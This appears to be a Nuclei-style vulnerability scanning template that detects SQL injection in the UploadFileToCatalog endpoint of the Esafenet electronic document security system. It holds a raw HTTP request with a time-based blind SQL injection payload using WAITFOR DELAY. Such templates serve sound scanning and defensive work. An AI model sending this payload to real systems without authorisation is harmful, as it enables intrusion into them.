id: poc-yaml-yisaitong-esafenet-uploadfiletocatalog-sqli
info:
  name: 亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    亿赛通电子文档安全管理系统 UploadFileToCatalog endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - raw:
      - |
        POST /CDGServer3/policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1';WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CDGServer3"
      - type: word
        part: body
        words:
          - "<html"
        negative: true
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration <= to_number(t2)
